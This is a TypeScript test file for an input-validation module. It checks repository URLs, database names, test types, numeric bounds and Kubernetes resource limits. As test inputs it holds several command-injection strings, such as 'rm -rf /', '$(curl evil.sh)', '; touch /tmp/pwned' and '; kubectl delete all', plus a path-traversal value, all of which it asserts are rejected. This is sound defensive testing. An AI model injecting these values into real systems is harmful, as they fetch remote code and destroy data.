import assert from "node:assert";
import {
	boundedInt,
	validDatabase,
	validLimit,
	validRepos,
	validRepoUrl,
	validRepoUrls,
	validTestTypes,
} from "../src/lib/engine/input-validation";

console.log("input-validation: trust boundary for start route...");

// repoUrl: injection payloads rejected
assert.strictEqual(validRepoUrl("postgres; touch /tmp/pwned"), null);
assert.strictEqual(validRepoUrl("https://github.com/x/demo.git`rm -rf /`"), null);
assert.strictEqual(validRepoUrl("$(curl evil.sh)"), null);

// repoUrl: accepted shapes
assert.strictEqual(
	validRepoUrl("https://github.com/chatnarongt/nestjs-platform-express-node.git"),
	"https://github.com/chatnarongt/nestjs-platform-express-node.git",
);
assert.strictEqual(
	validRepoUrl("git@github.com:chatnarongt/demo.git"),
	"git@github.com:chatnarongt/demo.git",
);
assert.strictEqual(validRepoUrl("/tmp/opencode/repos/demo"), "/tmp/opencode/repos/demo");
assert.strictEqual(
	validRepoUrl(undefined),
	"https://github.com/chatnarongt/nestjs-platform-express-node.git",
);

// repoUrls: blank rows dropped (never defaulted), deduped, ordered
assert.deepStrictEqual(
	validRepoUrls([
		"https://github.com/chatnarongt/nestjs-platform-express-node.git",
		"",
		"  ",
		"https://github.com/chatnarongt/nestjs-platform-express-bun.git",
		"https://github.com/chatnarongt/nestjs-platform-express-node.git",
	]),
	[
		"https://github.com/chatnarongt/nestjs-platform-express-node.git",
		"https://github.com/chatnarongt/nestjs-platform-express-bun.git",
	],
);

// repoUrls: one poisoned entry rejects the whole batch
assert.strictEqual(
	validRepoUrls(["https://github.com/x/ok.git", "postgres; touch /tmp/pwned"]),
	null,
);

// repoUrls: empty or all-blank is not a valid batch
assert.strictEqual(validRepoUrls([]), null);
assert.strictEqual(validRepoUrls(["", "   "]), null);
assert.strictEqual(validRepoUrls(undefined), null);
assert.strictEqual(validRepoUrls("https://github.com/x/one.git"), null);

// repoUrls: over the cap is rejected, not truncated
assert.strictEqual(
	validRepoUrls(Array.from({ length: 21 }, (_, i) => `https://github.com/x/repo${i}.git`)),
	null,
);
const atCap = validRepoUrls(
	Array.from({ length: 20 }, (_, i) => `https://github.com/x/repo${i}.git`),
);
assert.ok(atCap);
assert.strictEqual(atCap.length, 20);

// repoUrls: duplicates do not consume the cap
const dupes = validRepoUrls(Array.from({ length: 40 }, () => "https://github.com/x/only.git"));
assert.ok(dupes);
assert.strictEqual(dupes.length, 1);

// test types: only known vocabulary, deduped, non-empty
assert.deepStrictEqual(validTestTypes(["plaintext", "plaintext"]), ["plaintext"]);
assert.deepStrictEqual(validTestTypes(["read-one", "bogus", "delete-many"]), [
	"read-one",
	"delete-many",
]);
assert.strictEqual(validTestTypes([]), null);
assert.strictEqual(validTestTypes("plaintext"), null);
assert.strictEqual(validTestTypes(["rm -rf /"]), null);

// repos: per-repo database pairs, blanks dropped, deduped on url+database
assert.deepStrictEqual(
	validRepos([
		{ repoUrl: "https://github.com/x/ok.git", database: "postgres" },
		{ repoUrl: "", database: "mssql" },
		{ repoUrl: "  ", database: "mongodb" },
		{ repoUrl: "https://github.com/x/ok.git", database: "mongodb" },
		{ repoUrl: "https://github.com/x/ok.git", database: "postgres" },
		{ repoUrl: "https://github.com/x/bun.git" },
	]),
	[
		{ repoUrl: "https://github.com/x/ok.git", database: "postgres" },
		{ repoUrl: "https://github.com/x/ok.git", database: "mongodb" },
		{ repoUrl: "https://github.com/x/bun.git", database: "postgres" },
	],
);

// repos: one poisoned URL rejects the whole batch
assert.strictEqual(
	validRepos([
		{ repoUrl: "https://github.com/x/ok.git", database: "postgres" },
		{ repoUrl: "postgres; touch /tmp/pwned", database: "postgres" },
	]),
	null,
);

// repos: poisoned database value falls back to the default engine, not rejected
assert.deepStrictEqual(
	validRepos([{ repoUrl: "https://github.com/x/ok.git", database: "mssql; touch /tmp/pwned" }]),
	[{ repoUrl: "https://github.com/x/ok.git", database: "postgres" }],
);

// repos: empty or all-blank is not a valid batch
assert.strictEqual(validRepos([]), null);
assert.strictEqual(validRepos([{ repoUrl: "", database: "mssql" }]), null);
assert.strictEqual(validRepos(undefined), null);
assert.strictEqual(validRepos("https://github.com/x/one.git"), null);

// repos: cap applies to url+database pairs
assert.strictEqual(
	validRepos(
		Array.from({ length: 21 }, (_, i) => ({
			repoUrl: `https://github.com/x/repo${i}.git`,
			database: "postgres",
		})),
	),
	null,
);

// database: only known engines
assert.strictEqual(validDatabase("postgres"), "postgres");
assert.strictEqual(validDatabase("mongodb"), "mongodb");
assert.strictEqual(validDatabase("postgres; touch /tmp/pwned"), "postgres");

// numeric bounds: absurd or poisoned values fall back to defaults
assert.strictEqual(boundedInt("100; rm", 1, 1000, 100), 100);
assert.strictEqual(boundedInt(-5, 1, 1000, 100), 100);
assert.strictEqual(boundedInt(1e12, 1, 1000, 100), 100);
assert.strictEqual(boundedInt(250, 1, 1000, 100), 250);
assert.strictEqual(boundedInt(undefined, 1, 1000, 100), 100);

// resource limits: k8s quantity-ish grammar only
assert.strictEqual(validLimit("512Mi", "1"), "512Mi");
assert.strictEqual(validLimit("4", "1"), "4");
assert.strictEqual(validLimit("1; kubectl delete all", "1"), "1");
assert.strictEqual(validLimit("../../etc", "8Gi"), "8Gi");

console.log("input-validation tests passed.");
